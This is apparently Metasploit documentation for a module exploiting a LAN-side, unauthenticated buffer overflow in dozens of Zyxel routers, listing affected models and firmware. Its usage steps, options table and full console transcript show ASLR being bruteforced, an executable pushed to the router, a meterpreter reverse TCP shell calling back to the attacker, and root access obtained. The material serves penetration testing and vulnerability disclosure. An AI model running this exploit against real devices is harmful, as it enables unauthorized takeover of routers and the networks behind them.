## Vulnerable Application

This module exploits a buffer-overflow in multiple Zyxel devices. The vulnerability stems from missing string length
checks. The vulnerability can only be exploited from the LAN side, but does not require authentication. As ASLR is
activated, the libc address will be bruteforced. Thus the webserver will crash until successful exploitation. On
average this process takes 20 minutes.

This vulnerability was discovered by Steffen Robertz, Gerhard Hechenberger, Stefan Viehboeck and Thomas Weber of the SEC
Consult Vulnerability Lab in Vienna. The full writeup of all vulnerabilities is available here:
[https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/]


| Device       | Firmware  |
| ------------ | --------- |
| AMG1302-T11C | EOL       |
| VMG3925-B10C | EOL       |
| VMG8924-B10D | EOL       |
| VMG1312-B10D | EOL       |
| VMG3312-T20A | EOL       |
| VMG3625-T20A | EOL       |
| VMG3925-B10B | EOL       |
| VMG3925-B10C | EOL       |
| VMG3925-B30C | EOL       |
| VMG3926-B10A | EOL       |
| VMG5313-B10B | EOL       |
| VMG5313-B30B | EOL       |
| VMG8623-T50A | EOL       |
| VMG8823-B10B | EOL       |
| VMG8823-B30B | EOL       |
| VMG8823-B50B | EOL       |
| VMG8823-B60B | EOL       |
| VMG8924-B10D | EOL       |
| VMG8924-B30D | EOL       |
| PMG5317-T20A | EOL       |
| DX3301-T0 | V5.50(ABVY.3)C0 |
| DX5401-B0 | V5.17(ABYO.1)C0 |
| EMG3525-T50B | EMEA - V5.50(ABPM.6)C0 |
| EMG3525-T50B | S. America - V5.50(ABSL.0)b12 |
| EMG5523-T50B | EMEA - V5.50(ABPM.6)C0 |
| EMG5523-T50B | S. America - V5.50(ABSL.0)b12 |
| EMG5723-T50K | V5.50(ABOM.7)C0 |
| EX3301-T0 | V5.50(ABVY.3)C0 |
| EX5401-B0 | V5.17(ABYO.1)C0 |
| EX5501-B0 | V5.17(ABRY.2)C0 |
| LTE3301-PLUS | V1.00(ABQU.3)C0 |
| LTE7240-M403 | V2.00(ABMG.4)C0 |
| VMG1312-T20B | V5.50(ABSB.5)C0 |
| VMG3625-T50B | V5.50(ABPM.6)C0 |
| VMG3927-B50A | V5.17(ABMT.6)C0 |
| VMG3927-B60A | V5.17(ABMT.6)C0 |
| VMG3927-T50K | V5.50(ABOM.7)C0 |
| VMG4005-B50A | V5.15(ABQA.2)C0 |
| VMG8623-T50B | V5.50(ABPM.6)C0 |
| VMG8825-B50A | V5.17(ABMT.6)C0 |
| VMG8825-B50B | V5.17(ABNY.7)C0 |
| VMG8825-B60A | V5.17(ABMT.6)C0 |
| VMG8825-B60B | V5.17(ABNY.7)C0 |
| VMG8825-T50K | V5.50(ABOM.7)C0 |
| XMG3927-B50A | V5.17(ABMT.6)C0 |
| XMG8825-B50A | V5.17(ABMT.6)C0 |
| VPN2S | V1.20(ABLN.2)_00210319C1 |
| AX7501-B0 | V5.17(ABPC.1)C0 |
| EP240P | V5.40(ABVH.1)C0 |
| PMG5317-T20B | V5.40(ABKI.4)C0 |
| PMG5617GA | V5.40(ABNA.2)C0 |
| PMG5622GA | V5.40(ABNB.2)C0 |
| WX3100-T0 | V5.50(ABVL.1)C0 |
| WX3401-B0 | V5.17(ABVE.1)C0 |
| WSQ50 (Multy X) | V2.20(ABKJ.7)C0 |
| WSQ60 (Multy Plus) | V2.20(ABND.8)C0 |

## Verification Steps
 Follow these steps to exploit the target:

  1. Connect to a target on the LAN interface
  2. Start msfconsole
  3. Do: `use exploit/linux/misc/zyxel_multiple_devices_zhttp_lan_rce`
  4. Set RHOST, LHOST and SRVHOST
  5. Do `check`
  6. Do: `run`
  7. You should get a shell. On average this will take 20 minutes.
## Options
```
Module options (exploit/linux/misc/zyxel_multiple_devices_zhttp_lan_rce):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host
   

Payload options (linux/armle/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```



## Scenarios
```
msf6 > use exploit/linux/misc/zyxel_multiple_devices_zhttp_lan_rce
[*] Using configured payload linux/armle/meterpreter/reverse_tcp
msf6 exploit(linux/misc/zyxel_multiple_devices_zhttp_lan_rce) > set LHOST XXX.XXX.XXX.XXX
LHOST => XXX.XXX.XXX.XXX
msf6 exploit(linux/misc/zyxel_multiple_devices_zhttp_lan_rce) > set RHOSTS XXX.XXX.XXX.XXX
RHOSTS => XXX.XXX.XXX.XXX
msf6 exploit(linux/misc/zyxel_multiple_devices_zhttp_lan_rce) > check
[+] XXX.XXX.XXX.XXX:80 - The target is vulnerable.
msf6 exploit(linux/misc/zyxel_multiple_devices_zhttp_lan_rce) > set SRVHOST XXX.XXX.XXX.XXX
SRVHOST => XXX.XXX.XXX.XXX
msf6 exploit(linux/misc/zyxel_multiple_devices_zhttp_lan_rce) > run

[*] Started reverse TCP handler on XXX.XXX.XXX.XXX:4444
[*] Attempting to exploit VMG3312-T20A <= EOL
[*] Starting up our web service on XXX.XXX.XXX.XXX:8080 ...
[*] Using URL: http://XXX.XXX.XXX.XXX:8080/o
[*] Going to bruteforce ASLR, this will take a while...
[*] Trying to overflow the buffer, attempt 1
[*] Trying to overflow the buffer, attempt 2
[*] Trying to overflow the buffer, attempt 3
[*] Trying to overflow the buffer, attempt 4
[*] Trying to overflow the buffer, attempt 5
[*] Trying to overflow the buffer, attempt 6
[*] Trying to overflow the buffer, attempt 7
[*] Trying to overflow the buffer, attempt 8
[*] Trying to overflow the buffer, attempt 9
[*] Trying to overflow the buffer, attempt 10
[...]
[*] Trying to overflow the buffer, attempt 135
[*] Trying to overflow the buffer, attempt 136
[*] Trying to overflow the buffer, attempt 137
[*] Trying to overflow the buffer, attempt 138
[*] Trying to overflow the buffer, attempt 139
[+] XXX.XXX.XXX.XXX:80 - Sending executable to the router
[+] XXX.XXX.XXX.XXX:80 - A shell should connect soon!
[*] Sending stage (908480 bytes) to XXX.XXX.XXX.XXX
[*] Meterpreter session 1 opened (XXX.XXX.XXX.XXX:4444 -> XXX.XXX.XXX.XXX:55253) at 2022-07-24 19:03:41 +0200
[*] Server stopped.

meterpreter > shell
Process 9871 created.
Channel 1 created.
id
uid=0(root) gid=0
```
